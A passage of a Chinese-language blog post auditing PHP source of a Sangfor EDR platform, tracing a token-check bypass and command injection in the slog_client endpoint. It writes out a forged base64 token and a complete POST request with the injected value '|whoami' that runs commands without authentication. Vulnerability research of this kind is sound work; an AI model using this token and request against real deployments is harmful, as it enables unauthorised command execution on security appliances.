+</code></pre></div></div> <p>发现这里实际意义上就是将 <code class="language-plaintext highlighter-rouge">$file_path = "/etc/cssp_custom_image/os.json";</code> 带入 <code class="language-plaintext highlighter-rouge">get_json_from_file</code> 函数，继续跟进这个函数 :</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cd">/**
+ * 从文件读取一个json
+ * @param conf_file 文件路径+文件名
+ * @return data_arry 返回一个关联数组
+*/</span>
+<span class="k">function</span> <span class="nf">get_json_from_file</span><span class="p">(</span><span class="nv">$conf_file</span><span class="p">){</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$conf_file</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nx">ldb_error</span><span class="p">(</span><span class="s2">"err:file null"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nv">$json_string</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$conf_file</span><span class="p">);</span>
+    <span class="nv">$data_arry</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$json_string</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nb">is_null</span><span class="p">(</span><span class="nv">$data_arry</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nx">ldb_error</span><span class="p">(</span><span class="s2">"get json from file failed"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="nv">$data_arry</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div> <p>该函数就是从文件中读取JSON，并转为数组返回，我们想要知道具体内容就要看下初始的 <code class="language-plaintext highlighter-rouge">/etc/cssp_custom_image/os.json</code> 文件内容，但笔者这里安装默认情况下该文件是不存在的 :</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-09-03/15981333535662.jpg" alt="-w1076" /></p> <p>那在这里其返回的就是空，这时候我们再回到函数 <code class="language-plaintext highlighter-rouge">check_access_token</code>，其代码（ 代码上文中已经列出 ）逻辑当变量 <code class="language-plaintext highlighter-rouge">$key</code> 值为空并且 <code class="language-plaintext highlighter-rouge">$req_url == STD_CSSP_DOWN_CONF_URL</code>（ <code class="language-plaintext highlighter-rouge">define("STD_CSSP_DOWN_CONF_URL","/api/edr/sangforinter/v2/cssp/down_conf");</code> ） 的情况下变量 <code class="language-plaintext highlighter-rouge">$key</code> 值为常量 <code class="language-plaintext highlighter-rouge">STD_CSSP_DEFAULT_KEY</code> 的值，即: <code class="language-plaintext highlighter-rouge">define("STD_CSSP_DEFAULT_KEY","amsPnhHqfN5Ld5FU");</code>（ 常量定义在 <code class="language-plaintext highlighter-rouge">/bin/mapreduce/app/web/device_linkage/common/common.php</code> 文件中 ）。</p> <p>但此处我们的变量 <code class="language-plaintext highlighter-rouge">$req_url</code> 为 <code class="language-plaintext highlighter-rouge">/api/edr/sangforinter/v2/cssp/slog_client</code> 并不符合逻辑条件，所以变量 <code class="language-plaintext highlighter-rouge">$key</code> 还是为空的。</p> <p>那我们可以根据代码逻辑直接构建token值，首先是JSON内容有两个字段random、md5，还要满足字段md5的值等于<code class="language-plaintext highlighter-rouge">md5(字段random)</code>的值，所以我们要提前先设置字段random为1，随后进行md5加密并将结果赋予字段md5即可 :</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-09-03/15981351792870.jpg" alt="-w374" /></p> <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"random"</span><span class="p">:</span><span class="s2">"1"</span><span class="p">,</span><span class="w"> </span><span class="nl">"md5"</span><span class="p">:</span><span class="s2">"c4ca4238a0b923820dcc509a6f75849b"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div> <p>最后进行Base64编码 : <code class="language-plaintext highlighter-rouge">eyJyYW5kb20iOiIxMjMiLCAibWQ1IjoiYWI0NzU2M2FjNmZiOWU1MTdiZTg4ODBjODdmNzc2NWYifQ==</code></p> <p>至此我们就绕过了token校验限制。</p> <h5 id="逻辑梳理">逻辑梳理</h5> <p>我们来梳理函数 <code class="language-plaintext highlighter-rouge">get_interface_data</code> 的逻辑，其通过函数 <code class="language-plaintext highlighter-rouge">get_opr</code> 反回值带入函数 <code class="language-plaintext highlighter-rouge">get_app_name</code> 获取具体代码路径，而后当HTTP请求类型为POST时获取请求正文（ POST数据，如下函数 <code class="language-plaintext highlighter-rouge">get_body_data</code>，将请求正文的JSON转为数组 ），通过构建数组将数据填充进去，并返回该数组。（ 简单梳理，具体请看代码 ）</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cd">/**
+ * @fun        根据协议body中的内容来构造data中的内容
+ * @param      array     $argv      输入的参数
+ * @return     array     $params    联动设备传来的body
+ */</span>
+<span class="k">function</span> <span class="nf">get_body_data</span><span class="p">(</span><span class="nv">$argv</span><span class="p">){</span>
+    <span class="nv">$ini_file</span> <span class="o">=</span> <span class="nb">getenv</span><span class="p">(</span><span class="s2">"EPS_INSTALL_ROOT"</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"config/tenant.conf"</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$ini_file</span><span class="p">)){</span>
+        <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">!=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nx">ldb_post_json</span><span class="p">()))</span> <span class="p">{</span>
+            <span class="nv">$docker_data</span> <span class="o">=</span> <span class="nx">ldb_get_post</span><span class="p">(</span><span class="nv">$argv</span><span class="p">);</span>
+            <span class="k">return</span> <span class="nv">$docker_data</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="nv">$params</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+    <span class="k">if</span><span class="p">(</span><span class="mi">0</span> <span class="o">!=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nx">ldb_post_json</span><span class="p">()))</span> <span class="p">{</span>
+        <span class="nv">$params</span> <span class="o">=</span> <span class="nx">ldb_get_post</span><span class="p">(</span><span class="nv">$argv</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$params</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div> <p>我们已经知道了函数 <code class="language-plaintext highlighter-rouge">get_interface_data</code> 的逻辑，再跟进调用其的函数 <code class="language-plaintext highlighter-rouge">ldb_execute_app</code> 即可。</p> <h4 id="ldb_execute_app-函数分析">ldb_execute_app 函数分析</h4> <p>阅读过«对某终端检测响应平台<strong>权限绕过</strong>漏洞的审计流程»该分享的读者，大致就能理解这里函数的作用了：</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cd">/**
+ * @func      APP通用入口函数，将联动发来的信息转换成EDR通用的前后端接口
+ * @param     array    $args   输入的参数
+ */</span>
+<span class="k">function</span> <span class="nf">ldb_execute_app</span><span class="p">(</span><span class="nv">$args</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">try</span> <span class="p">{</span>
+
+        <span class="c1">//构造成业务统一处理的接口</span>
+        <span class="nv">$interface_data</span> <span class="o">=</span> <span class="nx">get_interface_data</span><span class="p">(</span><span class="nv">$args</span><span class="p">);</span>
+        <span class="c1">// 检验请求信息是否包含注入关键字</span>
+        <span class="nv">$ignore_check</span> <span class="o">=</span> <span class="nx">read_ignore_check_info</span><span class="p">();</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">mongo_injection_check</span><span class="p">(</span><span class="nv">$interface_data</span><span class="p">,</span> <span class="nv">$ignore_check</span><span class="p">)</span> <span class="o">===</span> <span class="kc">TRUE</span><span class="p">)</span> 
+        <span class="p">{</span>
+            <span class="nx">response_linkage_dev_die_msg</span><span class="p">(</span><span class="nx">ldb_get_lang</span><span class="p">(</span><span class="nx">ARGV_CONTAIN_RISK</span><span class="p">),</span> <span class="nx">RESPONSE_ERROR</span><span class="p">);</span>
+            <span class="nx">ldb_error</span><span class="p">(</span><span class="s2">"request argv contain mongodb risk keyword, argv="</span> <span class="o">.</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$interface_data</span><span class="p">));</span>
+            <span class="k">return</span> <span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="c1">//特殊开权限控制函数</span>
+        <span class="nx">special_auth</span><span class="p">(</span><span class="nv">$interface_data</span><span class="p">);</span>
+        <span class="c1">//授权控制</span>
+        <span class="nx">authorize_check</span><span class="p">(</span><span class="nv">$interface_data</span><span class="p">);</span>
+        <span class="nx">ldb_debug</span><span class="p">(</span><span class="s2">"interface_data is "</span> <span class="o">.</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$interface_data</span><span class="p">));</span>
+        <span class="nv">$app</span> <span class="o">=</span> <span class="nv">$interface_data</span><span class="p">[</span><span class="s2">"app_args"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">];</span>
+        <span class="nv">$constructor</span> <span class="o">=</span> <span class="nx">ldb_mapreduce_invoke</span><span class="p">(</span><span class="s2">"get"</span><span class="p">,</span> <span class="nv">$app</span><span class="p">);</span>
+        <span class="c1">// 构建应用对象</span>
+        <span class="nv">$instance</span> <span class="o">=</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$constructor</span><span class="p">);</span>
+        <span class="nv">$ret</span> <span class="o">=</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$instance</span><span class="o">-&gt;</span><span class="na">main</span><span class="p">,</span> <span class="nv">$instance</span><span class="p">,</span> <span class="nv">$interface_data</span><span class="p">);</span>
+        <span class="c1">//响应出错返回相应的状态码</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$ret</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$err_code</span> <span class="o">=</span> <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$instance</span><span class="o">-&gt;</span><span class="na">res</span><span class="p">,</span> <span class="nv">$instance</span><span class="p">);</span>
+            <span class="nx">response_linkage_dev_msg</span><span class="p">(</span><span class="nv">$err_code</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="c1">// 销毁应用对象</span>
+        <span class="nb">call_user_func</span><span class="p">(</span><span class="nv">$instance</span><span class="o">-&gt;</span><span class="na">destroy</span><span class="p">,</span> <span class="nv">$instance</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">catch</span><span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">){</span>
+        <span class="c1">//通知联动设备</span>
+        <span class="nv">$err_msg</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();</span>
+        <span class="nx">response_linkage_dev_die_msg</span><span class="p">(</span><span class="nv">$err_msg</span><span class="p">,</span> <span class="nx">RESPONSE_ERROR</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="c1">// 入口函数</span>
+<span class="nv">$args</span> <span class="o">=</span> <span class="nx">ldb_argv_get</span><span class="p">();</span>
+<span class="nx">ldb_execute_app</span><span class="p">(</span><span class="nv">$args</span><span class="p">);</span>
+</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">ldb_execute_app</code> 函数传入参数为变量 <code class="language-plaintext highlighter-rouge">$args</code>，该值通过函数 <code class="language-plaintext highlighter-rouge">ldb_argv_get</code> 获取，跟进发现就是获取的 URI 部分。</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cd">/**
+ * 获取命令行参数
+ * @return array 返回命令行参数
+ */</span>
+<span class="k">function</span> <span class="nf">ldb_argv_get</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">ldb_is_cli</span><span class="p">())</span> <span class="p">{</span>
+        <span class="k">global</span> <span class="nv">$argv</span><span class="p">;</span>
+        <span class="k">return</span> <span class="nv">$argv</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nv">$args</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'PHP_SELF'</span><span class="p">]);</span>
+    <span class="k">return</span> <span class="nv">$args</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div> <h2 id="逻辑梳理与漏洞利用">逻辑梳理与漏洞利用</h2> <p>由于之前的步骤都是逆推，这里我们直接顺着推一遍流程就能理清整个思路了。</p> <p>假设在此我们访问的是 <code class="language-plaintext highlighter-rouge">/api/edr/sangforinter/v2/cssp/slog_client</code>，那就是其传入函数 <code class="language-plaintext highlighter-rouge">get_interface_data</code>，由于需要过 <code class="language-plaintext highlighter-rouge">check_token</code>，所以访问地址需为 <code class="language-plaintext highlighter-rouge">/api/edr/sangforinter/v2/cssp/slog_client?token=eyJyYW5kb20iOiIxIiwgIm1kNSI6ImM0Y2E0MjM4YTBiOTIzODIwZGNjNTA5YTZmNzU4NDliIn0=</code>。</p> <p>而后通过函数 <code class="language-plaintext highlighter-rouge">get_opr</code> 得到了 <code class="language-plaintext highlighter-rouge">exec_slog_action</code>，再根据 <code class="language-plaintext highlighter-rouge">exec_slog_action</code> 获得了具体代码路径 <code class="language-plaintext highlighter-rouge">app.web.device_linkage.process_cssp</code>，最后根据 <code class="language-plaintext highlighter-rouge">opr</code>、<code class="language-plaintext highlighter-rouge">app_name</code> 以及 <code class="language-plaintext highlighter-rouge">data</code>（ 这里的data需为POST请求方式时才有 ）构造数组返回，这里测试就是GET请求，最后返回数据为：</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">array</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+  <span class="p">[</span><span class="s2">"app_args"</span><span class="p">]</span><span class="o">=&gt;</span>
+  <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="p">[</span><span class="s2">"name"</span><span class="p">]</span><span class="o">=&gt;</span>
+    <span class="kt">string</span><span class="p">(</span><span class="mi">35</span><span class="p">)</span> <span class="s2">"app.web.device_linkage.process_cssp"</span>
+  <span class="p">}</span>
+  <span class="p">[</span><span class="s2">"opr"</span><span class="p">]</span><span class="o">=&gt;</span>
+  <span class="kt">string</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="s2">"exec_slog_action"</span>
+<span class="p">}</span>
+</code></pre></div></div> <p>变量 <code class="language-plaintext highlighter-rouge">$interface_data</code> 获取了函数 <code class="language-plaintext highlighter-rouge">get_interface_data</code> 的返回值，由于<code class="language-plaintext highlighter-rouge">ldb_execute_app</code> 函数代码很多，不过多赘述，有几处授权校验的函数，简单跟踪下看下注释就能了解CSSP请求不处理授权：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-09-03/15981751022649.jpg" alt="-w855" /></p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-09-03/15981750951438.jpg" alt="-w665" /></p> <p>回调调用 <code class="language-plaintext highlighter-rouge">app.web.device_linkage.process_cssp</code> 的函数 <code class="language-plaintext highlighter-rouge">main</code> 传入变量 <code class="language-plaintext highlighter-rouge">$instance</code>、<code class="language-plaintext highlighter-rouge">$interface_data</code>（ 函数 <code class="language-plaintext highlighter-rouge">get_interface_data</code> 的返回值 ），那我们跟进 <code class="language-plaintext highlighter-rouge">main</code> 函数，又是回调函数调用 <code class="language-plaintext highlighter-rouge">exec_slog_action</code> 并传入变量 <code class="language-plaintext highlighter-rouge">$object</code>、<code class="language-plaintext highlighter-rouge">$params</code> （ 函数 <code class="language-plaintext highlighter-rouge">get_interface_data</code> 的返回值 ）。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-09-03/15981754820272.jpg" alt="-w542" /></p> <p>这样无法造成命令执行，我们在之前 <code class="language-plaintext highlighter-rouge">exec_slog_action 匿名函数分析</code> 中了解到其要获取 <code class="language-plaintext highlighter-rouge">$params['data']['params']</code> 带入命令执行语句中，由于我们测试的是GET请求，函数 <code class="language-plaintext highlighter-rouge">get_interface_data</code> 的返回值并没有 <code class="language-plaintext highlighter-rouge">data['params']</code> 这个key，而刚好函数 <code class="language-plaintext highlighter-rouge">get_interface_data</code> 中的变量 <code class="language-plaintext highlighter-rouge">$interface_data["data"]</code> 会获取函数 <code class="language-plaintext highlighter-rouge">get_body_data</code> 处理请求正文的JSON内容转为数组的结果，所以我们修改请求方法为POST，请求正文为：<code class="language-plaintext highlighter-rouge">{"params":"|whoami"}</code>，即可进行命令注入从而执行。</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// {"params":"|whoami"}` -&gt; array('params' =&gt; '|whoami')</span>
+<span class="nv">$interface_data</span><span class="p">[</span><span class="s2">"data"</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'params'</span> <span class="o">=&gt;</span> <span class="s1">'|whoami'</span><span class="p">);</span>
+</code></pre></div></div> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-09-03/15982381570192.jpg" alt="-w1278" /></p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">POST</span> <span class="o">/</span><span class="nx">api</span><span class="o">/</span><span class="nx">edr</span><span class="o">/</span><span class="nx">sangforinter</span><span class="o">/</span><span class="nx">v2</span><span class="o">/</span><span class="nx">cssp</span><span class="o">/</span><span class="nx">slog_client</span><span class="o">?</span><span class="nx">token</span><span class="o">=</span><span class="nx">eyJyYW5kb20iOiIxIiwgIm1kNSI6ImM0Y2E0MjM4YTBiOTIzODIwZGNjNTA5YTZmNzU4NDliIn0</span><span class="o">=</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nx">Host</span><span class="o">:</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">31.136</span>
+<span class="nx">Connection</span><span class="o">:</span> <span class="nx">close</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span> <span class="mi">20</span>
+<span class="nx">Accept</span><span class="o">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">json</span><span class="p">,</span> <span class="nx">text</span><span class="o">/</span><span class="nx">plain</span><span class="p">,</span> <span class="o">*/*</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nx">Macintosh</span><span class="p">;</span> <span class="nx">Intel</span> <span class="nx">Mac</span> <span class="nx">OS</span> <span class="nx">X</span> <span class="mi">10_15_6</span><span class="p">)</span> <span class="nx">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="nx">KHTML</span><span class="p">,</span> <span class="nx">like</span> <span class="nx">Gecko</span><span class="p">)</span> <span class="nx">Chrome</span><span class="o">/</span><span class="mf">84.0</span><span class="o">.</span><span class="mf">4147.135</span> <span class="nx">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Origin</span><span class="o">:</span> <span class="nx">https</span><span class="o">://</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">31.136</span>
+<span class="nx">Referer</span><span class="o">:</span> <span class="nx">https</span><span class="o">://</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">31.136</span><span class="o">/</span><span class="nx">ui</span><span class="o">/</span><span class="nx">login</span><span class="o">.</span><span class="nx">php</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span> <span class="nx">gzip</span><span class="p">,</span> <span class="nx">deflate</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span> <span class="nx">zh</span><span class="o">-</span><span class="nx">CN</span><span class="p">,</span><span class="nx">zh</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+
+<span class="p">{</span><span class="s2">"params"</span><span class="o">:</span><span class="s2">"|whoami"</span><span class="p">}</span>
+</code></pre></div></div> <h2 id="最后">最后</h2> <p>熟悉了解了整个流程之后，其实还有更多利用点可以挖掘～本文就不过多的赘述了。</p> </article> <div class="page-navigation code"> <a class="next" href="http://localhost:4000/archives/2020-10-19/0" title="NEXT: 米斯特安全团队五岁后随笔">&lt;&lt;</a> <span> &middot; </span> <a class="home" href="http://localhost:4000/" title="Back to Index">INDEX</a> <span> &middot; </span> <a class="prev" href="http://localhost:4000/archives/2020-09-03/3" title="PREV: 某终端检测响应平台代码审计挖掘（权限绕过）">&gt;&gt;</a> </div> </div> <div class="footer"> <span class="block">&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-2021</span> </div> <script src="/fancybox/lib/jquery-1.10.2.min.js"></script> <script type="text/javascript" src="/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script> <script> $(document).ready(function() { $("article img").each(function() { var strA = "<a style='text-decoration: none;' id='imgid' href='" + this.src + "'></a>"; $(this).wrapAll(strA); }); }); $("#imgid").fancybox({ openEffect : 'elastic', closeEffect : 'elastic', }); </script> </body> </html>
